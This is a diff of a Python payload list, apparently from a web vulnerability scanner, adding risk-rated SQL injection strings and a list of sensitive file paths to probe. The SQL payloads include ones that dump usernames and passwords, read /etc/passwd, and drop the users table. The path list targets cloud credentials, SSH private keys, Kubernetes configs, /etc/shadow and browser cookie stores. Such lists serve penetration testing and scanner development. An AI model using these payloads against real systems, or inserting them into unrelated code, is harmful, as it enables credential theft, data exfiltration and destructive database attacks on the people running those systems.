+    {"payload": "' AND ASCII(SUBSTRING((SELECT @@version),1,1))=53 -- ", "risk": "medium"},  # Check for database version
+    {"payload": "' AND (SELECT 1 FROM information_schema.tables WHERE table_name = 'users') -- ", "risk": "medium"},  # Check if 'users' table exists
+    {"payload": "' AND SUBSTRING(@@version, 1, 1) = 5 --", "risk": "medium"},  # Check for MySQL version
+    {"payload": "' AND 1=1 UNION SELECT NULL, version() -- ", "risk": "medium"},  # Extract DB version
+    {"payload": "' UNION SELECT username, password, email FROM users -- ", "risk": "high"},  # Extract user data
+    {"payload": "' OR 1=1; DROP TABLE users -- ", "risk": "high"},  # Destructive SQLi (drop table)
+    {"payload": "1'; DROP TABLE users --", "risk": "high"},  # Drop users table via SQLi
+    {"payload": "1' OR 1=1; SELECT * FROM users --", "risk": "high"},  # Extract all user data
+    {"payload": "' OR 1=1; SELECT load_file('/etc/passwd') -- ", "risk": "high"},  # Read system files (e.g., /etc/passwd)
+    {"payload": "' OR 1=1; SELECT group_concat(column_name) FROM information_schema.columns -- ", "risk": "high"},  # Retrieve all column names
+    {"payload": "' OR 1=1; SELECT extractvalue(1,concat(0x7e,(SELECT @@version))) -- ", "risk": "high"},  # SQLi to extract server version
+    {"payload": "1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')=1 -- ", "risk": "high"},  # SQLi to extract password (admin) character-by-character
+    {"payload": "' OR 1=1; SELECT concat_ws(':',username,password) FROM users LIMIT 1 -- ", "risk": "high"},  # Extract username and password from users table
+    {"payload": "' AND 1=1 UNION SELECT NULL, current_database() -- ", "risk": "medium"},  # Extract current database
+    {"payload": "' AND (SELECT 1 FROM information_schema.columns WHERE table_name='users' LIMIT 1)=1 -- ", "risk": "medium"},  # Check for 'users' table columns
+    {"payload": "' AND (SELECT 1 FROM sys.tables WHERE name='users')=1 -- ", "risk": "medium"},  # Check if 'users' table exists in SQL Server
+    {"payload": "1' AND (SELECT 1 FROM pg_stat_activity LIMIT 1)=1 -- ", "risk": "medium"},  # PostgreSQL activity check
+    {"payload": "' AND 1=1 UNION SELECT NULL, database() -- ", "risk": "medium"},  # Get the current database name
+    {"payload": "1' AND 1=1 UNION SELECT NULL, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() -- ", "risk": "medium"},  # Get tables in current database
+    {"payload": "' OR 1=1; SELECT user() --", "risk": "medium"},  # Get current MySQL user
+    {"payload": "1 AND 1=1", "risk": "low"},  # Simple true condition (no data leakage)
+    {"payload": "1 AND 1=2", "risk": "low"},  # False condition, often used to test SQLi presence
+    {"payload": "admin' AND 1=1 -- ", "risk": "low"},  # Login bypass (admin context)
+    {"payload": "admin' AND 1=2 -- ", "risk": "low"},  # False condition for testing
+    {"payload": "1' AND 1=1 ORDER BY 1 -- ", "risk": "low"},  # Test SQLi vulnerability via ORDER BY clause
+    {"payload": "1' AND BINARY 'a'='A' -- ", "risk": "low"},  # Case sensitivity check in SQL (typically for MySQL)
+    {"payload": "1' AND 1=1; SELECT table_name FROM information_schema.tables -- ", "risk": "low"},  # List tables in the current database
+    {"payload": "1' AND 1=1; SELECT column_name FROM information_schema.columns WHERE table_name='users' --", "risk": "low"},  # List columns in the 'users' table
+    {"payload": "' AND 1=1 -- ", "risk": "low"},  # General test payload to check for SQLi vulnerability
+    {"payload": "' OR 1=1; SELECT schema_name FROM information_schema.schemata -- ", "risk": "medium"},  # List all schemas
+    {"payload": "' UNION SELECT NULL, database(), user() -- ", "risk": "medium"},  # Get DB, and user
+    {"payload": "' UNION SELECT NULL, table_name FROM information_schema.tables -- ", "risk": "medium"},  # List tables from information schema
+    {"payload": "' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' -- ", "risk": "medium"},  # List columns from 'users' table
+    {"payload": "' OR 1=1; SELECT * FROM mysql.db -- ", "risk": "high"},  # Get MySQL database privileges
 ]
+
 
 # Sensitive File Paths
 SENSITIVE_FILES = [
-    {"payload": "/.git/", "risk": "high"},
-    {"payload": "/.env", "risk": "high"},
-    {"payload": "/config.php", "risk": "high"},
-    {"payload": "/wp-config.php", "risk": "high"},
-    {"payload": "/database.yml", "risk": "high"},
-    {"payload": "/admin/", "risk": "medium"},
-    {"payload": "/backup/", "risk": "medium"},
-    {"payload": "/logs/", "risk": "medium"},
-    {"payload": "/.htaccess", "risk": "high"},
-    {"payload": "/.htpasswd", "risk": "high"},
-    {"payload": "/phpinfo.php", "risk": "high"},
-    {"payload": "/.DS_Store", "risk": "low"},
-    {"payload": "/web.config", "risk": "high"},
-    {"payload": "/credentials.json", "risk": "high"},
-    {"payload": "/secrets.json", "risk": "high"},
-    {"payload": "/private_key.pem", "risk": "high"},
-    {"payload": "/devconfig.ini", "risk": "medium"},
-    {"payload": "/test.php", "risk": "medium"},
-    {"payload": "/config.ini", "risk": "medium"},
-    {"payload": "/old_version/", "risk": "low"},
-    {"payload": "/dump.sql", "risk": "high"},
-    {"payload": "/database.sql", "risk": "high"},
-    {"payload": "/backup.sql", "risk": "high"},
-    {"payload": "/uploads/testfile.pdf", "risk": "medium"},
-    {"payload": "/home/user/.ssh/id_rsa", "risk": "high"},
-    {"payload": "/etc/passwd", "risk": "high"},
-    {"payload": "/etc/shadow", "risk": "high"},
-    {"payload": "/etc/hostname", "risk": "medium"},
-    {"payload": "/etc/hosts", "risk": "medium"},
-    {"payload": "/.git/refs/heads/master", "risk": "high"},
-    {"payload": "/backup/latest.tar.gz", "risk": "high"},
-    {"payload": "/tmp/testfile.sql", "risk": "medium"},
-    {"payload": "/root/.ssh/id_rsa", "risk": "high"},
-    {"payload": "/var/log/auth.log", "risk": "high"},
-    {"payload": "/var/log/apache2/error.log", "risk": "high"},
-    {"payload": "/.gitmodules", "risk": "high"},
-    {"payload": "/etc/mysql/my.cnf", "risk": "high"},
-    {"payload": "/etc/mysql/mysql.conf.d/mysqld.cnf", "risk": "high"},
-    {"payload": "/usr/share/bugtracker/.git/HEAD", "risk": "high"},
-    {"payload": "/.vscode/settings.json", "risk": "medium"},
-    {"payload": "/etc/ssl/private/server.key", "risk": "high"},
-    {"payload": "/tmp/secret.key", "risk": "high"},
-    {"payload": "/config/secrets.yml", "risk": "high"},
-    {"payload": "/etc/ssh/sshd_config", "risk": "high"},
-    {"payload": "/var/backups/database_backup.sql", "risk": "high"},
-    {"payload": "/.bash_history", "risk": "high"},
-    {"payload": "/.terraform/environment.tfvars", "risk": "high"},
-    {"payload": "/home/user/.docker/config.json", "risk": "high"},
-    {"payload": "/.idea/workspace.xml", "risk": "medium"},
-    {"payload": "/docker-compose.yml", "risk": "medium"},
-    {"payload": "/composer.lock", "risk": "medium"},
-    {"payload": "/yarn.lock", "risk": "low"},
-    {"payload": "/cache/", "risk": "medium"},
-    {"payload": "/temp/", "risk": "medium"},
-    {"payload": "/tmp/", "risk": "medium"},
-    {"payload": "/sessions/", "risk": "medium"},
-    {"payload": "/gulpfile.js", "risk": "medium"},
-    {"payload": "/webpack.config.js", "risk": "high"},
-    {"payload": "/package.json", "risk": "high"},
-    {"payload": "/bower.json", "risk": "medium"},
-    {"payload": "/manifest.json", "risk": "medium"},
-    {"payload": "/security.txt", "risk": "low"},
-    {"payload": "/.well-known/security.txt", "risk": "low"},
-    {"payload": "/CHANGELOG.md", "risk": "low"},
-    {"payload": "/README.md", "risk": "low"},
-    {"payload": "/LICENSE", "risk": "low"},
-    {"payload": "/COPYING", "risk": "low"},
-    {"payload": "/robots.txt", "risk": "low"},
-    {"payload": "/etc/my.cnf", "risk": "high"},
-    {"payload": "/.git/objects/", "risk": "high"},
-    {"payload": "/.terraform/environment.tf", "risk": "high"},
-    {"payload": "/var/log/mysql/error.log", "risk": "high"},
-    {"payload": "/backup/mysql_dump.sql", "risk": "high"},
-    {"payload": "/.vscode/launch.json", "risk": "medium"},
-    {"payload": "/home/user/.bash_profile", "risk": "medium"},
-    {"payload": "/etc/nginx/nginx.conf", "risk": "high"},
-    {"payload": "/var/www/html/backup.tar.gz", "risk": "high"},
-    {"payload": "/.aws/credentials", "risk": "high"},
-    {"payload": "/.gitlab-ci.yml", "risk": "high"},
-    {"payload": "/.kube/config", "risk": "high"},
-    {"payload": "/.github/workflows/build.yml", "risk": "high"},
-    {"payload": "/metadata.json", "risk": "high"},
-    {"payload": "/var/run/docker.sock", "risk": "high"},
-    {"payload": "/.npmrc", "risk": "high"},
-    {"payload": "/Jenkinsfile", "risk": "high"},
-    {"payload": "/.travis.yml", "risk": "high"},
-    {"payload": "/api/config.yaml", "risk": "high"},
-    {"payload": "/.azure/credentials", "risk": "high"},
-    {"payload": "/etc/ansible/ansible.cfg", "risk": "high"},
-    {"payload": "/.gcloud/credentials.json", "risk": "high"},
-    {"payload": "/var/log/nginx/access.log", "risk": "high"},
-    {"payload": "/.bashrc", "risk": "medium"},
-    {"payload": "/etc/crontab", "risk": "high"},
-    {"payload": "/.yarnrc", "risk": "high"},
-    {"payload": "/etc/redis/redis.conf", "risk": "high"},
-    {"payload": "/.dockerignore", "risk": "medium"},
-    {"payload": "/.github/dependabot.yml", "risk": "high"},
-    {"payload": "/etc/prometheus/prometheus.yml", "risk": "high"},
-    {"payload": "/.okta/credentials", "risk": "high"},
-    {"payload": "/var/log/syslog", "risk": "high"},
-    {"payload": "/.npmignore", "risk": "medium"},
-    {"payload": "/etc/supervisord.conf", "risk": "high"},
-    {"payload": "/.serverless/serverless.yml", "risk": "high"},
-    {"payload": "/etc/logrotate.conf", "risk": "medium"},
-    {"payload": "/.vercel/project.json", "risk": "high"},
-    {"payload": "/etc/elasticsearch/elasticsearch.yml", "risk": "high"},
-    {"payload": "/.aws/config", "risk": "high"},
-    {"payload": "/etc/grafana/grafana.ini", "risk": "high"},
-    {"payload": "/.git-credentials", "risk": "high"},
-    {"payload": "/var/log/dmesg", "risk": "high"},
-    {"payload": "/.pypirc", "risk": "high"},
-    {"payload": "/etc/uwsgi/apps-enabled/site.ini", "risk": "high"},
-    {"payload": "/.netlify/state.json", "risk": "high"},
-    {"payload": "/etc/chrony/chrony.conf", "risk": "medium"},
-    {"payload": "/.buildkite/pipeline.yml", "risk": "high"},
-    {"payload": "/etc/memcached.conf", "risk": "high"},
-    {"payload": "/.gitignore", "risk": "medium"},
-    {"payload": "/etc/apache2/apache2.conf", "risk": "high"},
-    {"payload": "/.ssh/authorized_keys", "risk": "high"},
-    {"payload": "/var/log/httpd/error_log", "risk": "high"},
-    {"payload": "/etc/postfix/main.cf", "risk": "high"},
-    {"payload": "/.gnupg/secring.gpg", "risk": "high"},
-    {"payload": "/var/www/html/.env.bak", "risk": "high"},
-    {"payload": "/etc/letsencrypt/live/domain/privkey.pem", "risk": "high"},
-    {"payload": "/.config/google-chrome/Default/Cookies", "risk": "high"},
-    {"payload": "/etc/httpd/conf/httpd.conf", "risk": "high"},
-    {"payload": "/root/.ssh/authorized_keys", "risk": "high"},
-    {"payload": "/var/log/nginx/error.log", "risk": "high"},
-    {"payload": "/etc/dovecot/dovecot.conf", "risk": "high"},
-    {"payload": "/home/user/.gnupg/gpg.conf", "risk": "high"},
-    {"payload": "/var/www/html/config.bak", "risk": "high"},
-    {"payload": "/etc/ssl/certs/server.crt", "risk": "high"},
-    {"payload": "/.config/firefox/Profiles/cookies.sqlite", "risk": "high"},
-    {"payload": "/.env.local", "risk": "high"},
-    {"payload": "/etc/nginx/sites-enabled/default", "risk": "high"},
-    {"payload": "/home/user/.config/aws/credentials", "risk": "high"},
-    {"payload": "/var/www/html/.gitignore", "risk": "medium"},
-    {"payload": "/.env.development", "risk": "high"},
-    {"payload": "/etc/uwsgi/uwsgi.ini", "risk": "high"},
-    {"payload": "/home/user/.config/gcloud/credentials.db", "risk": "high"},
-    {"payload": "/var/log/audit/audit.log", "risk": "high"},
-    {"payload": "/.circleci/config.yaml", "risk": "high"},
-    {"payload": "/.env.production", "risk": "high"},
-    {"payload": "/etc/haproxy/haproxy.cfg", "risk": "high"},
-    {"payload": "/home/user/.ssh/config", "risk": "high"},
-    {"payload": "/var/log/postgresql/postgresql.log", "risk": "high"},
-    {"payload": "/.github/workflows/deploy.yml", "risk": "high"}
+    {"payload": "/.git/", "risk": "high"},  # Git repository may expose full codebase, secrets, history
+    {"payload": "/.env", "risk": "high"},  # Often contains database credentials, API keys
+    {"payload": "/config.php", "risk": "high"},  # May include DB credentials, environment setup
+    {"payload": "/wp-config.php", "risk": "high"},  # WordPress DB settings and secrets
+    {"payload": "/database.yml", "risk": "high"},  # Ruby/Rails DB credentials file
+    {"payload": "/staging-config.json", "risk": "medium"},  # Staging environment, may contain secrets
+    {"payload": "/tmp/debug.log", "risk": "medium"},  # Debug output, can reveal application internals
+    {"payload": "/old/config.bak", "risk": "medium"},  # Backup of config files
+    {"payload": "/.hg/", "risk": "medium"},  # Mercurial repo exposure
+    {"payload": "/.svn/", "risk": "medium"},  # Subversion repo exposure
+    {"payload": "/.htaccess", "risk": "high"},  # Apache config, may reveal access rules or server logic
+    {"payload": "/.htpasswd", "risk": "high"},  # Username/password hashes for HTTP auth
+    {"payload": "/phpinfo.php", "risk": "high"},  # Full PHP environment disclosure, useful for attackers
+    {"payload": "/web.config", "risk": "high"},  # IIS server config, may include sensitive path info
+    {"payload": "/credentials.json", "risk": "high"},  # Often used by Google/AWS SDKs to store API secrets
+    {"payload": "/secrets.json", "risk": "high"},  # Generic secrets storage file, often used in dev
+    {"payload": "/private_key.pem", "risk": "high"},  # Exposes private key, leads to full system compromise
+    {"payload": "/.gitmodules", "risk": "high"},  # Can point to internal submodules or repos
+    {"payload": "/etc/passwd", "risk": "high"},  # System user list (old Unix-style attacks)
+    {"payload": "/etc/shadow", "risk": "high"},  # Password hashes, very dangerous if accessible
+    {"payload": "/etc/mysql/my.cnf", "risk": "high"},  # MySQL credentials in config
+    {"payload": "/var/log/auth.log", "risk": "high"},  # Contains SSH login attempts, can aid brute force
+    {"payload": "/etc/nginx/nginx.conf", "risk": "high"},  # Web server config and possible internal paths
+    {"payload": "/.aws/credentials", "risk": "high"},  # AWS secret and access keys
+    {"payload": "/.gitlab-ci.yml", "risk": "high"},  # CI/CD pipeline config may contain tokens
+    {"payload": "/.kube/config", "risk": "high"},  # Kubernetes cluster access credentials
+    {"payload": "/var/run/docker.sock", "risk": "high"},  # Docker remote API socket, full host control
+    {"payload": "/Jenkinsfile", "risk": "high"},  # Jenkins pipeline, can expose build logic and credentials
+    {"payload": "/.terraform/environment.tfvars", "risk": "high"},  # Terraform vars may contain secrets
+    {"payload": "/.npmrc", "risk": "high"},  # Node.js credentials for private registry
+    {"payload": "/etc/ssl/private/server.key", "risk": "high"},  # TLS private key for HTTPS
+    {"payload": "/tmp/secret.key", "risk": "high"},  # Generic placeholder for leaked secrets
+    {"payload": "/var/log/mysql/error.log", "risk": "high"},  # Can reveal DB errors or queries
+    {"payload": "/admin/", "risk": "medium"},  # Admin panel, potential brute-force or logic flaws
+    {"payload": "/backup/", "risk": "medium"},  # Backup folder may expose previous versions or files
+    {"payload": "/logs/", "risk": "medium"},  # Directory listing may reveal application logs
+    {"payload": "/devconfig.ini", "risk": "medium"},  # Dev config, may contain minor secrets or debug info
+    {"payload": "/test.php", "risk": "medium"},  # Test endpoint might expose debug output
+    {"payload": "/config.ini", "risk": "medium"},  # Generic config file, may contain DB or API settings
+    {"payload": "/uploads/testfile.pdf", "risk": "medium"},  # Uploads folder may allow traversal or injection
+    {"payload": "/.git/objects/", "risk": "high"},  # Access to raw git objects, reconstruct full repo
+    {"payload": "/.git/refs/heads/master", "risk": "high"},  # Points to latest commit in repo
+    {"payload": "/var/www/html/backup.tar.gz", "risk": "high"},  # Full site backup, may include sensitive data
+    {"payload": "/var/log/syslog", "risk": "high"},  # System-wide logs, great for info disclosure
+    {"payload": "/etc/ansible/ansible.cfg", "risk": "high"},  # May reveal infrastructure setup
+    {"payload": "/.serverless/serverless.yml", "risk": "high"},  # May contain AWS functions and secrets
+    {"payload": "/.git-credentials", "risk": "high"},  # Stores plaintext GitHub/git credentials
+    {"payload": "/.ssh/authorized_keys", "risk": "high"},  # SSH public keys can aid lateral movement
+    {"payload": "/var/log/postgresql/postgresql.log", "risk": "high"},  # DB errors/logs, may leak queries
+    {"payload": "/etc/crontab", "risk": "high"},  # Scheduled jobs, may contain sensitive commands
+    {"payload": "/.well-known/security.txt", "risk": "low"},  # Standardized security contact info
+    {"payload": "/favicon.ico", "risk": "low"},  # Site icon; may help fingerprinting
+    {"payload": "/humans.txt", "risk": "low"},  # Info about dev team, purely cosmetic
+    {"payload": "/crossdomain.xml", "risk": "low"},  # Flash site security policy file
+    {"payload": "/sitemap.xml", "risk": "low"},  # Lists indexed site pages
+    {"payload": "/etc/hostname", "risk": "medium"},  # Reveals server hostname (internal info)
+    {"payload": "/etc/hosts", "risk": "medium"},  # Can reveal internal IPs or aliases
+    {"payload": "/tmp/testfile.sql", "risk": "medium"},  # DB dump in temporary location
+    {"payload": "/.vscode/settings.json", "risk": "medium"},  # Dev editor config, may leak paths or creds
+    {"payload": "/apple-touch-icon.png", "risk": "low"},  # iOS home screen icon
+    {"payload": "/browserconfig.xml", "risk": "low"},  # IE/Edge site configuration
+    {"payload": "/manifest.webmanifest", "risk": "low"},  # Web app manifest file for PWA
+    {"payload": "/index.html", "risk": "low"},  # Public home page; useful for fingerprinting
+    {"payload": "/home", "risk": "low"},  # Home route, often public
+    {"payload": "/about", "risk": "low"},  # About page, contains company/app info
+    {"payload": "/docker-compose.yml", "risk": "medium"},  # May contain DB/service configurations
+    {"payload": "/composer.lock", "risk": "medium"},  # PHP dependency tree (can fingerprint versions)
+    {"payload": "/.idea/workspace.xml", "risk": "medium"},  # JetBrains IDE config, may contain paths
+    {"payload": "/bower.json", "risk": "medium"},  # Legacy frontend dependencies
+    {"payload": "/manifest.json", "risk": "medium"},  # Web app manifest, may include PWA config
+    {"payload": "/.gitignore", "risk": "medium"},  # Shows what is excluded (hint at hidden files)
+    {"payload": "/.vscode/launch.json", "risk": "medium"},  # Launch configs, may reveal entry points
+    {"payload": "/.bash_history", "risk": "medium"},  # Shell history, might contain sensitive commands
+    {"payload": "/.terraform/environment.tf", "risk": "medium"},  # Terraform config structure
+    {"payload": "/home/user/.bash_profile", "risk": "medium"},  # User env setup, may expose aliases or secrets
+    {"payload": "/var/log/apache2/error.log", "risk": "medium"},  # Web server error log, info disclosure
+    {"payload": "/app/config/local.json", "risk": "medium"},  # Local app configs, potentially dev-only info
+    {"payload": "/admin/config.php", "risk": "medium"},  # Admin config page, may contain paths or settings
+    {"payload": "/vagrantfile", "risk": "medium"},  # Virtual environment config
+    {"payload": "/app.log", "risk": "medium"},  # App-specific log file, may leak info
+    {"payload": "/debug/", "risk": "medium"},  # Directory with debug-related files
+    {"payload": "/.DS_Store", "risk": "low"},  # macOS metadata file, reveals filenames and structure
+    {"payload": "/security.txt", "risk": "low"},  # Contact info for security researchers
+    {"payload": "/CHANGELOG.md", "risk": "low"},  # Lists changes/version history
+    {"payload": "/README.md", "risk": "low"},  # Public documentation
+    {"payload": "/LICENSE", "risk": "low"},  # Open-source license text
+    {"payload": "/COPYING", "risk": "low"},  # GNU license or similar
+    {"payload": "/robots.txt", "risk": "low"},  # Sitemap and crawl directives
+    
 ]
